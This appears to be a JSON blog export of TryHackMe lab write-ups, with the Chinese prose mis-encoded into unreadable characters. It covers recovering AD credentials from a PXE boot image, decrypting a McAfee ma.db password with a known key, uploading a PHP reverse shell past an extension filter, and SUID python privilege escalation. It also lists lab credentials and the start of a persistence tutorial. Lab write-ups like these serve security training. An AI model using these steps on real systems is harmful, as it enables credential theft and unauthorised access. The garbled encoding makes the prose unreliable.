æ­¤è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯¹æ­¤ SSH ä¼šè¯è¿›è¡Œèº«ä»½éªŒè¯ï¼š ssh thm@THMJMP1.za.tryhackme.com ä»¥åŠ Password1@ çš„å¯†ç ã€‚ ä¸ºäº†ç¡®ä¿ç½‘ç»œçš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ SSHï¼Œé¦–å…ˆä½¿ç”¨æ‚¨çš„ç”¨æˆ·ååˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶å°† powerpxe å­˜å‚¨åº“å¤åˆ¶åˆ°æ­¤æ–‡ä»¶å¤¹ä¸­ï¼š C:\\Users\\THM&gt;cd Documents C:\\Users\\THM\\Documents&gt; mkdir hybcx C:\\Users\\THM\\Documents&gt; copy C:\\powerpxe hybcx\\ C:\\Users\\THM\\Documents\\&gt; cd hybcx æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨ TFTP å¹¶ä¸‹è½½ BCD æ–‡ä»¶æ¥è¯»å– MDT æœåŠ¡å™¨çš„é…ç½®ã€‚ TFTP æ¯” FTP æœ‰ç‚¹æ£˜æ‰‹ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•åˆ—å‡ºæ–‡ä»¶ã€‚ç›¸åï¼Œæˆ‘ä»¬å‘é€æ–‡ä»¶è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†é€šè¿‡ UDP è¿æ¥å›æˆ‘ä»¬ä»¥ä¼ è¾“æ–‡ä»¶ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨æŒ‡å®šæ–‡ä»¶å’Œæ–‡ä»¶è·¯å¾„æ—¶éœ€è¦å‡†ç¡®ã€‚ BCD æ–‡ä»¶å§‹ç»ˆä½äº MDT æœåŠ¡å™¨ä¸Šçš„ /Tmp/ ç›®å½•ä¸­ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ SSH ä¼šè¯ä¸­ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ TFTP ä¼ è¾“ï¼š tftp -i 10.200.9.202 GET \"\\Tmp\\x64{E212701C-9A00-4A53-866C-F5DDD6C087D9}.bcd\" conf.bcd æ‚¨å¿…é¡»ä½¿ç”¨ nslookup thmmdt.za.tryhackme.com æŸ¥æ‰¾ THMMDT IPã€‚ç°åœ¨ BCD æ–‡ä»¶å·²æ¢å¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ powerpxe è¯»å–å…¶å†…å®¹ã€‚ Powerpxe æ˜¯ä¸€ä¸ª PowerShell è„šæœ¬ï¼Œå¯è‡ªåŠ¨æ‰§è¡Œæ­¤ç±»æ”»å‡»ï¼Œä½†é€šå¸¸ä¼šäº§ç”Ÿä¸åŒçš„ç»“æœï¼Œå› æ­¤æœ€å¥½æ‰§è¡Œæ‰‹åŠ¨æ–¹æ³•ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ powerpxe çš„ Get-WimFile å‡½æ•°ä» BCD æ–‡ä»¶ä¸­æ¢å¤ PXE å¯åŠ¨æ˜ åƒçš„ä½ç½®ï¼š powershell -executionpolicy bypass WIM æ–‡ä»¶æ˜¯ Windows æ˜ åƒæ ¼å¼ (WIM) çš„å¯å¯åŠ¨æ˜ åƒã€‚ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº† PXE å¯åŠ¨æ˜ åƒçš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å†æ¬¡ä½¿ç”¨ TFTP ä¸‹è½½è¯¥æ˜ åƒï¼š tftp -i 10.200.9.202 GET \"\\Boot\\x64\\Images\\LiteTouchPE_x64.wim\" pxeboot.wim ç”±äºæ‚¨æ­£åœ¨ä¸‹è½½å®Œå…¨å¯å¯åŠ¨ä¸”å·²é…ç½®çš„ Windows æ˜ åƒï¼Œå› æ­¤æ­¤ä¸‹è½½å°†éœ€è¦ä¸€æ®µæ—¶é—´ã€‚ä¹Ÿè®¸åœ¨ç­‰å¾…çš„æ—¶å€™ä¼¸ä¼¸è…¿ï¼Œå–æ¯æ°´ã€‚ ä» PXE å¯åŠ¨æ˜ åƒæ¢å¤å‡­è¯ ç°åœ¨æˆ‘ä»¬å·²ç»æ¢å¤äº† PXE å¯åŠ¨æ˜ åƒï¼Œæˆ‘ä»¬å¯ä»¥çªƒå–å­˜å‚¨çš„å‡­æ®ã€‚åº”è¯¥æŒ‡å‡ºçš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å‘èµ·å„ç§æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥æ³¨å…¥æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå› æ­¤ä¸€æ—¦æ˜ åƒå¯åŠ¨ï¼Œæˆ‘ä»¬å°±å…·æœ‰ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å®‰è£…æ˜ åƒä»¥æ‹¥æœ‰åŠ å…¥åŸŸçš„è®¡ç®—æœºã€‚å¦‚æœæ‚¨æœ‰å…´è¶£äº†è§£æœ‰å…³è¿™äº›æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥é˜…è¯»æœ¬æ–‡ã€‚æœ¬æ¬¡ç»ƒä¹ å°†é‡ç‚¹å…³æ³¨å°è¯•çªƒå–å‡­æ®çš„ç®€å•æ”»å‡»ã€‚ æˆ‘ä»¬å°†å†æ¬¡ä½¿ç”¨ powerpxe æ¥æ¢å¤å‡­æ®ï¼Œä½†æ‚¨ä¹Ÿå¯ä»¥é€šè¿‡æå–æ˜ åƒå¹¶æŸ¥æ‰¾ bootstrap.ini æ–‡ä»¶ï¼ˆé€šå¸¸å­˜å‚¨è¿™äº›ç±»å‹çš„å‡­æ®ï¼‰æ¥æ‰‹åŠ¨æ‰§è¡Œæ­¤æ­¥éª¤ã€‚è¦ä½¿ç”¨ powerpxe ä»å¼•å¯¼æ–‡ä»¶æ¢å¤å‡­æ®ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š Get-FindCredentials -WimFile pxeboot.wim å¦‚æ‚¨æ‰€è§ï¼Œpowerpxe èƒ½å¤Ÿæ¢å¤ AD å‡­æ®ã€‚æˆ‘ä»¬ç°åœ¨æœ‰äº†å¦ä¸€ç»„å¯ä»¥ä½¿ç”¨çš„ AD å‡­æ®ï¼ 0x07 é…ç½®æ–‡ä»¶ æˆ‘ä»¬å°†åœ¨æ­¤ç½‘ç»œä¸­æ¢ç´¢çš„æœ€åä¸€ä¸ªæšä¸¾é€”å¾„æ˜¯é…ç½®æ–‡ä»¶ã€‚å‡è®¾æ‚¨è¶³å¤Ÿå¹¸è¿ï¼Œé€ æˆäº†ä¸€æ¬¡æ¼æ´ï¼Œä½¿æ‚¨èƒ½å¤Ÿè®¿é—®ç»„ç»‡ç½‘ç»œä¸Šçš„ä¸»æœºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé…ç½®æ–‡ä»¶æ˜¯å°è¯•æ¢å¤ AD å‡­æ®çš„ç»ä½³æ¢ç´¢é€”å¾„ã€‚æ ¹æ®è¢«ç ´åçš„ä¸»æœºï¼Œå„ç§é…ç½®æ–‡ä»¶å¯èƒ½å…·æœ‰æšä¸¾ä»·å€¼ï¼š Web åº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ æœåŠ¡é…ç½®æ–‡ä»¶ Registry keys æ³¨å†Œè¡¨é¡¹ é›†ä¸­éƒ¨ç½²çš„åº”ç”¨ç¨‹åº å¯ä»¥ä½¿ç”¨å¤šä¸ªæšä¸¾è„šæœ¬ï¼ˆä¾‹å¦‚ Seatbeltï¼‰æ¥è‡ªåŠ¨æ‰§è¡Œæ­¤è¿‡ç¨‹ã€‚ é…ç½®æ–‡ä»¶å‡­è¯ ä½†æ˜¯ï¼Œåœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ä»é›†ä¸­éƒ¨ç½²çš„åº”ç”¨ç¨‹åºæ¢å¤å‡­æ®ã€‚é€šå¸¸ï¼Œè¿™äº›åº”ç”¨ç¨‹åºéœ€è¦ä¸€ç§åœ¨å®‰è£…å’Œæ‰§è¡Œé˜¶æ®µå¯¹åŸŸè¿›è¡Œèº«ä»½éªŒè¯çš„æ–¹æ³•ã€‚æ­¤ç±»åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªç¤ºä¾‹æ˜¯ McAfee Enterprise Endpoint Securityï¼Œç»„ç»‡å¯ä»¥å°†å…¶ç”¨ä½œç«¯ç‚¹æ£€æµ‹å’Œå®‰å…¨å“åº”å·¥å…·ã€‚ McAfee å°†å®‰è£…æœŸé—´ç”¨äºè¿æ¥å› Orchestrator çš„å‡­æ®åµŒå…¥åä¸º ma.db çš„æ–‡ä»¶ä¸­ã€‚å¯ä»¥é€šè¿‡å¯¹ä¸»æœºçš„æœ¬åœ°è®¿é—®æ¥æ£€ç´¢å’Œè¯»å–è¯¥æ•°æ®åº“æ–‡ä»¶ï¼Œä»¥æ¢å¤å…³è”çš„ AD æœåŠ¡å¸æˆ·ã€‚åœ¨æœ¬ç»ƒä¹ ä¸­ï¼Œæˆ‘ä»¬å°†å†æ¬¡ä½¿ç”¨ THMJMP1 ä¸Šçš„ SSH è®¿é—®ã€‚ ma.db æ–‡ä»¶å­˜å‚¨åœ¨å›ºå®šä½ç½®ï¼š æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SCP å°† ma.db å¤åˆ¶åˆ°æˆ‘ä»¬çš„ AttackBoxï¼š scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . ä¸ºäº†è¯»å–æ•°æ®åº“æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªåä¸º sqlitebrowser çš„å·¥å…·ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰“å¼€æ•°æ®åº“ï¼š sqlitebrowser ma.db ä½¿ç”¨ sqlitebrowserï¼Œæˆ‘ä»¬å°†é€‰æ‹©â€œæµè§ˆæ•°æ®â€é€‰é¡¹å¹¶å…³æ³¨ AGENT_REPOSITORIES è¡¨ï¼š æˆ‘ä»¬å¯¹ç¬¬äºŒä¸ªæ¡ç›®ç‰¹åˆ«æ„Ÿå…´è¶£ï¼Œé‡ç‚¹æ˜¯ DOMAINã€AUTH_USER å’Œ AUTH_PASSWD å­—æ®µæ¡ç›®ã€‚è®°ä¸‹è¿™äº›æ¡ç›®ä¸­å­˜å‚¨çš„å€¼ã€‚ä½†æ˜¯ï¼ŒAUTH_PASSWD å­—æ®µå·²åŠ å¯†ã€‚å¹¸è¿çš„æ˜¯ï¼ŒMcAfee ä½¿ç”¨å·²çŸ¥å¯†é’¥åŠ å¯†è¯¥å­—æ®µã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹æ—§çš„ python2 è„šæœ¬æ¥è§£å¯†å¯†ç ã€‚è¯¥è„šæœ¬å·²ä½œä¸ºå¯ä¸‹è½½çš„ä»»åŠ¡æ–‡ä»¶æˆ–åœ¨ AttackBox ä¸Šæä¾›ï¼Œå¯ä»¥åœ¨ /root/Rooms/BreachingAD/task7/ ç›®å½•ä¸­æ‰¾åˆ°ã€‚ æ³¨æ„ï¼šæˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨çš„å·¥å…·å·²ç»å¾ˆæ—§äº†ã€‚å®ƒä½¿ç”¨ Python v2 å¹¶ä¾èµ–äºæ—§çš„åŠ å¯†åº“ã€‚å¦‚æœæ‚¨æ— æ³•è®©è„šæœ¬åœ¨æ‚¨è‡ªå·±çš„è™šæ‹Ÿæœºä¸Šè¿è¡Œï¼Œâ€‹â€‹è¯·ä½¿ç”¨ AttackBoxã€‚ä¸è¿‡ï¼Œè¯¥åº”ç”¨ç¨‹åºæœ€è¿‘è¿›è¡Œäº†æ›´æ–°ï¼Œä»¥ç¡®ä¿å®ƒä¹Ÿå¯ä»¥åœ¨ Python3 ä¸Šè¿è¡Œï¼Œæ‚¨å¯ä»¥åœ¨æ­¤å¤„ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼šhttps://github.com/funoverip/mcafee-sitelist-pwd-decryption æ‚¨å¿…é¡»è§£å‹ç¼© mcafee-sitelist-pwd-decryption.zip æ–‡ä»¶ï¼Œé€šè¿‡å‘è„šæœ¬æä¾›æˆ‘ä»¬çš„ base64 ç¼–ç å’ŒåŠ å¯†å¯†ç ï¼Œè¯¥è„šæœ¬å°†æä¾›è§£å¯†çš„å¯†ç ï¼š python3 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== ç°åœ¨ï¼Œæˆ‘ä»¬å†æ¬¡æ‹¥æœ‰äº†ä¸€ç»„ AD å‡­æ®ï¼Œå¯ç”¨äºè¿›ä¸€æ­¥æšä¸¾ï¼è¿™åªæ˜¯ä»é…ç½®æ–‡ä»¶æ¢å¤å‡­æ®çš„ç¤ºä¾‹ä¹‹ä¸€ã€‚å¦‚æœæ‚¨èƒ½å¤Ÿåœ¨ä¸»æœºä¸Šç«™ç¨³è„šè·Ÿï¼Œè¯·åŠ¡å¿…éµå¾ªè¯¦ç»†è€Œå®Œå–„çš„æ–¹æ³•ï¼Œä»¥ç¡®ä¿ä»ä¸»æœºæ¢å¤æ‰€æœ‰æˆ˜åˆ©å“ï¼ŒåŒ…æ‹¬å‡­è¯å’Œå…¶ä»–å¯ä»¥å­˜å‚¨åœ¨é…ç½®æ–‡ä»¶ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚ 0x08 æ€»ç»“ å¯ä»¥é€šè¿‡å¤§é‡çš„æ”»å‡»é€”å¾„æ¥ç ´å ADã€‚æˆ‘ä»¬ä»‹ç»äº†è¯¥ç½‘ç»œä¸­çº¢é˜Ÿæ¼”ä¹ æœŸé—´å¸¸ç”¨çš„ä¸€äº›å¸¸ç”¨æ–¹æ³•ã€‚ç”±äºæ”»å‡»é¢çš„å·¨å¤§ï¼Œäººä»¬ä¸æ–­å‘ç°æ¢å¤ç¬¬ä¸€ç»„ AD å‡­æ®çš„æ–°é€”å¾„ã€‚éœ€è¦å»ºç«‹é€‚å½“çš„æšä¸¾æ–¹æ³•å¹¶ä¸æ–­æ›´æ–°å®ƒæ‰èƒ½æ‰¾åˆ°åˆå§‹å‡­è¯å¯¹ã€‚ é˜²å¾¡æªæ–½ åœ¨é˜²å¾¡æªæ–½æ–¹é¢ï¼Œç»„ç»‡å¯ä»¥é‡‡å–ä¸€äº›æ­¥éª¤ï¼š ç”¨æˆ·æ„è¯†å’ŒåŸ¹è®­ - ç½‘ç»œå®‰å…¨é“¾ä¸­æœ€è–„å¼±çš„ç¯èŠ‚å‡ ä¹æ€»æ˜¯ç”¨æˆ·ã€‚å¯¹ç”¨æˆ·è¿›è¡ŒåŸ¹è®­ï¼Œè®©ä»–ä»¬æ„è¯†åˆ°åœ¨æ³„éœ²å‡­è¯ç­‰æ•æ„Ÿä¿¡æ¯æ—¶åº”å°å¿ƒè°¨æ…ï¼Œå¹¶ä¸”ä¸è¦ä¿¡ä»»å¯ç–‘ç”µå­é‚®ä»¶ï¼Œä»è€Œå‡å°‘è¿™ç§æ”»å‡»é¢ã€‚ é™åˆ¶åœ¨çº¿ AD æœåŠ¡å’Œåº”ç”¨ç¨‹åºçš„æš´éœ² - å¹¶éæ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½å¿…é¡»å¯é€šè¿‡ Internet è®¿é—®ï¼Œå°¤å…¶æ˜¯é‚£äº›æ”¯æŒ NTLM å’Œ LDAP èº«ä»½éªŒè¯çš„åº”ç”¨ç¨‹åºã€‚ç›¸åï¼Œè¿™äº›åº”ç”¨ç¨‹åºåº”æ”¾ç½®åœ¨å¯é€šè¿‡ VPN è®¿é—®çš„ Intranet ä¸­ã€‚ç„¶åï¼ŒVPN å¯ä»¥æ”¯æŒå¤šé‡èº«ä»½éªŒè¯ä»¥å¢å¼ºå®‰å…¨æ€§ã€‚ å®æ–½ç½‘ç»œè®¿é—®æ§åˆ¶ (NAC) - NAC å¯ä»¥é˜²æ­¢æ”»å‡»è€…è¿æ¥ç½‘ç»œä¸Šçš„æ¶æ„è®¾å¤‡ã€‚ç„¶è€Œï¼Œè¿™å°†éœ€è¦ç›¸å½“å¤šçš„åŠªåŠ›ï¼Œå› ä¸ºåˆæ³•è®¾å¤‡å¿…é¡»è¢«åˆ—å…¥ç™½åå•ã€‚ å¼ºåˆ¶æ‰§è¡Œ SMB ç­¾å - é€šè¿‡å¼ºåˆ¶æ‰§è¡Œ SMB ç­¾åï¼Œä¸å¯èƒ½è¿›è¡Œ SMB ä¸­ç»§æ”»å‡»ã€‚ éµå¾ªæœ€å°æƒé™åŸåˆ™ - åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿæ¢å¤ä¸€ç»„ AD å‡­æ®ã€‚é€šè¿‡éµå¾ªæœ€å°ç‰¹æƒåŸåˆ™ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç”¨äºæœåŠ¡çš„å‡­è¯ï¼Œå¯ä»¥æ˜¾ç€é™ä½ä¸è¿™äº›å‡­è¯è¢«æ³„éœ²ç›¸å…³çš„é£é™©ã€‚ ç°åœ¨æˆ‘ä»¬å·²ç»çªç ´äº† ADï¼Œä¸‹ä¸€æ­¥æ˜¯æ‰§è¡Œ AD çš„æšä¸¾ï¼Œä»¥æ›´å¥½åœ°ç†è§£åŸŸç»“æ„å¹¶è¯†åˆ«å¯è¢«åˆ©ç”¨çš„æ½œåœ¨é”™è¯¯é…ç½®ã€‚è¿™å°†åœ¨ä¸‹ä¸€ä¸ªæˆ¿é—´ä¸­ä»‹ç»ã€‚è®°å¾—æ¸…é™¤DNSé…ç½®ï¼","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-RootMe","path":"/2024/02/08/thm-rootme/","content":"0x01 å‰è¨€ ç¬¬ä¸€æ¬¡åšTHMçš„é¶æœºï¼Œå¯¹æ¸—é€å•¥çš„æ€è·¯ä¸å’‹æœ‰ï¼Œè¾¹åšè¾¹å­¦å§ã€‚ 0x02 ä»»åŠ¡æ¡†æ¶ éƒ¨ç½²æœºå™¨-ã€‹ä¾¦æŸ¥-ã€‹è·å–shell-ã€‹æƒé™æå‡ 0x03 é¶æœºä¹‹æ—… é‰´äºæˆ‘æ˜¯æ–°æ‰‹ï¼Œå‰æœŸå°±è®°å½•çš„è¯¦ç»†ä¸€äº›ï¼Œæ–¹ä¾¿æ—¥åå¤ç›˜ã€‚ nmapæ‰«æ nmap -sS -sV -A -p 1-65535 10.10.92.95 è¿™ç§æ‰«ææ–¹å¼æœ‰äº¿ç‚¹æ…¢ï¼Œä»¥åçœ‹ç€æ¢ä»€ä¹ˆæ–¹å¼å¥½ï¼ˆä½†å¾ˆå…¨ï¼‰ ç«¯å£ä¿¡æ¯å¦‚ä¸Šï¼Œå¯ä»¥çœ‹åˆ°åªå¼€å¯äº†22ä¸80ç«¯å£ Gobusteræ‰«ç›®å½• gobuster dir -u \"http://10.10.92.95/\" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt æ¥ä¸‹æ¥çš„ä»»åŠ¡æ˜¯è®©æˆ‘ä»¬æ‹¿åˆ°åå‘shellï¼Œé‚£æˆ‘ä»¬å°±è®¿é—®ä¸€ä¸‹webç›®å½•çœ‹çœ‹ è®¿é—®Webç›®å½• æ‰¾å¯»ä¸€ç•ªï¼Œåªå‘ç°panelè¿™ä¸€ç›®å½•å¯ç–‘ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œè¿™é‡Œæˆ‘å…ˆæ˜¯éšä¾¿ä¸Šä¼ äº†ä¸ªå¸¦é©¬çš„PHPæ–‡ä»¶ï¼Œå‘ç°è¢«banäº†ï¼Œè¿™æ—¶å€™æ²¡å•¥æ€è·¯äº†ï¼Œçœ‹äº†ä¸€ä¸‹walkthroughï¼š ç»“åˆshellçš„ç›®çš„ï¼Œä¼°è®¡å°±æ˜¯ä¸Šä¼ å¸¦æœ‰åå‘shellçš„PHPè„šæœ¬ï¼Œè¿åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºã€‚è„šæœ¬åœ°å€å¦‚ä¸‹ï¼š https://github.com/pentestmonkey/php-reverse-shell ä¸‹è½½å¥½ä¹‹åï¼Œæ‰¾åˆ°PHPæ–‡ä»¶ï¼Œä¿®æ”¹æœ€ç»ˆåå¼¹çš„åœ°å€ï¼š æˆ‘ä»¬æ‰¾åˆ°openvpnå¯¹åº”IPä¿®æ”¹å³å¯ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä½¿ php-reverse-shell è„šæœ¬å¯æ‰§è¡Œï¼šchmod +x php_reverse_shell.php æ–‡ä»¶ä¸Šä¼ æ¼æ´ è¿™é‡Œä¿®æ”¹å¥½ä¹‹åå°±æ˜¯ä¸Šä¼ æ–‡ä»¶äº†ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šå›¾ä¸Šä¼ çš„æ—¶å€™ï¼Œæ˜¾ç¤ºçš„ä¼¼ä¹æ˜¯ä¸å…è®¸PHPåç¼€çš„æ–‡ä»¶ä¸Šä¼ ã€‚å…¶å®è¿™é‡Œæµ‹è¯•å‡ ç•ªæˆ‘å‘ç°æˆ‘è‡ªå·±æ˜¯çœŸçš„èœï¼Œå­¦äº†å¾ˆå¤šç»•è¿‡æ€è·¯ï¼Œåˆ°è¿™é‡Œå°±æ— ä»ä¸‹æ‰‹ï¼Œåƒåœ¾æ­»äº†ï¼ï¼ä¹‹åæ— å¥ˆçœ‹äº†wpå‘ç°ä»–ä»¬åˆ©ç”¨äº†Apacheè§£ææ¼æ´ï¼Œå…¶å®è¿™é‡Œåœ¨nmapçš„æ—¶å€™å°±æç¤ºæˆ‘ä»¬äº†ï¼Œä¸è¿‡æˆ‘å¿ƒé‡Œæ„Ÿè§‰æ˜¯ä¸ä¼šæœ‰Apacheæ¼æ´çš„ã€‚ã€‚ã€‚ã€‚ ä¸å¤šè¯´åºŸè¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ php5åç¼€ã€phtmlæˆ–è€…è§£ææ¼æ´ï¼šjpg.php å‚è€ƒåœ°å€ï¼šhttps://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload è¿™é‡Œæˆ‘å°±ç”¨php5äº†ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼  æ¥ä¸‹æ¥è®¿é—®ä¸Šä¼ åœ°å€ï¼ˆé¡µé¢æœ‰å›æ˜¾ï¼‰ï¼Œè®¿é—®uploadsç›®å½•çœ‹çœ‹ï¼ˆè¿™é‡Œæˆ‘ç›´æ¥ç‚¹äº†è¶…é“¾æ¥è¿›å…¥åˆ°æ–‡ä»¶ä¸Šä¼ åœ°å€ï¼Œä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¿é—®ï¼‰å¦‚ä¸‹å›¾ï¼Œç‚¹å‡»å³å¯ ä½†è¦æ³¨æ„æå‰å¼€å¯ç›‘å¬ï¼š åå¼¹shell å¯ä»¥çœ‹åˆ°åœ¨ç‚¹å‡»æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†shellï¼Œä¹‹åå‘ç°æƒé™ä¸å¤Ÿï¼Œè‚¯å®šå°±æ˜¯ææƒäº†ã€‚ é¢˜ç›®ä¹Ÿæç¤ºæˆ‘ä»¬suidææƒï¼š suidææƒ find / -user root -perm -4000 -print 2&gt;/dev/null è¿™é‡Œå‘ç°pythonæ¯”è¾ƒå¯ç–‘ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹ï¼Œå¦‚ä¸‹å›¾ï¼Œå«æœ‰æƒé™sï¼Œæ„å‘³ç€è¢«è®¾ç½®äº†suidæƒé™ é‚£ç›´æ¥pythonææƒå³å¯ï¼šhttps://gtfobins.github.io/gtfobins/python/ python -c 'import os; os.system(\"/bin/sh\")' æˆåŠŸææƒ æ‹¿flag flag1 flag2 0x04 æ€»ç»“ è‡³äºsuidææƒï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥æ€»ç»“ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚åç»­å¦èµ·æ–‡ç« å§ æ€»çš„æ¥è¯´è¿™ä¸ªé¶æœºå¾ˆåŸºç¡€ï¼Œä½†å¯¹æˆ‘ç¡®æœ‰éš¾åº¦~~ï¼Œç»§ç»­å‹‰åŠ±ï¼ 0x05 å‚è€ƒæ–‡ç«  RootMe CTF: TryHackMe A Beginnerâ€™s Guide to Capture the flag TryHackMe : RootMe CTF Writeup (Detailed) TryHackMe-RootMe Nmap å¸¸ç”¨å‘½ä»¤æ€»ç»“ 2022è“å¸½æ¯é‡è§çš„ SUID ææƒ æ€»ç»“ç¯‡ æµ…è°ˆlinux suidææƒ","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Windowsæœ¬åœ°æŒä¹…æ€§","path":"/2024/02/06/thm-windows-ben-di-chi-jiu-xing/","content":"0x01 ç®€ä»‹ åœ¨ç›®æ ‡çš„å†…éƒ¨ç½‘ç»œä¸Šè·å¾—ç¬¬ä¸€ä¸ªç«‹è¶³ç‚¹åï¼Œæ‚¨éœ€è¦ç¡®ä¿åœ¨çœŸæ­£è·å¾—çš‡å† ä¸Šçš„å®çŸ³ä¹‹å‰ä¸ä¼šå¤±å»å¯¹å®ƒçš„è®¿é—®æƒé™ã€‚å»ºç«‹æŒä¹…æ€§æ˜¯æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…åœ¨è·å¾—ç½‘ç»œè®¿é—®æƒé™æ—¶é¦–å…ˆè¦åšçš„ä»»åŠ¡ä¹‹ä¸€ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒæŒä¹…æ€§æ˜¯æŒ‡åˆ›å»ºæ›¿ä»£æ–¹æ³•æ¥é‡æ–°è·å¾—å¯¹ä¸»æœºçš„è®¿é—®æƒé™ï¼Œè€Œæ— éœ€å†æ¬¡ç»å†åˆ©ç”¨é˜¶æ®µã€‚ æ‚¨å¸Œæœ›å°½å¿«å»ºç«‹æŒä¹…æ€§çš„åŸå› æœ‰å¾ˆå¤šï¼ŒåŒ…æ‹¬ï¼š é‡æ–°åˆ©ç”¨å¹¶ä¸æ€»æ˜¯å¯èƒ½çš„ï¼šä¸€äº›ä¸ç¨³å®šçš„åˆ©ç”¨å¯èƒ½ä¼šåœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­æ€æ­»æ˜“å—æ”»å‡»çš„è¿›ç¨‹ï¼Œè®©æ‚¨å¯¹å…¶ä¸­ä¸€äº›è¿›ç¨‹è¿›è¡Œä¸€æ¬¡æ”»å‡»ã€‚ è·å¾—ç«‹è¶³ç‚¹å¾ˆéš¾é‡ç°ï¼šä¾‹å¦‚ï¼Œå¦‚æœæ‚¨ä½¿ç”¨ç½‘ç»œé’“é±¼æ´»åŠ¨æ¥è·å¾—ç¬¬ä¸€æ¬¡è®¿é—®æƒé™ï¼Œé‚£ä¹ˆé‡å¤å®ƒæ¥é‡æ–°è·å¾—å¯¹ä¸»æœºçš„è®¿é—®æƒé™ç®€ç›´å°±æ˜¯å¤ªå¤šçš„å·¥ä½œã€‚æ‚¨çš„ç¬¬äºŒæ¬¡è¥é”€æ´»åŠ¨ä¹Ÿå¯èƒ½ä¸ä¼šé‚£ä¹ˆæœ‰æ•ˆï¼Œå¯¼è‡´æ‚¨æ— æ³•è®¿é—®ç½‘ç»œã€‚ è“é˜Ÿæ­£åœ¨è¿½æ•æ‚¨ï¼šå¦‚æœæ‚¨çš„æ“ä½œè¢«æ£€æµ‹åˆ°ï¼Œç”¨äºè·å¾—æ‚¨é¦–æ¬¡è®¿é—®æƒé™çš„ä»»ä½•æ¼æ´éƒ½å¯èƒ½ä¼šè¢«ä¿®è¡¥ã€‚æ‚¨æ­£åœ¨ä¸æ—¶é—´èµ›è·‘ï¼ è™½ç„¶æ‚¨å¯ä»¥ä¿ç•™æŸäº›ç®¡ç†å‘˜çš„å¯†ç å“ˆå¸Œå¹¶é‡æ–°ä½¿ç”¨å®ƒæ¥é‡æ–°è¿æ¥ï¼Œä½†æ‚¨æ€»æ˜¯é¢ä¸´è¿™äº›å‡­æ®åœ¨æŸäº›æ—¶å€™è¢«è½®æ¢çš„é£é™©ã€‚å¦å¤–ï¼Œè¿˜æœ‰ä¸€äº›æ›´ç‹¡çŒ¾çš„æ–¹æ³•å¯ä»¥è®©æ‚¨é‡æ–°è·å¾—å¯¹å—æ„ŸæŸ“æœºå™¨çš„è®¿é—®æƒï¼Œä»è€Œä½¿è“é˜Ÿçš„æ—¥å­å˜å¾—æ›´åŠ è‰°éš¾ã€‚ 0x02 æœ¬åœ°æŒä¹…æ€§ 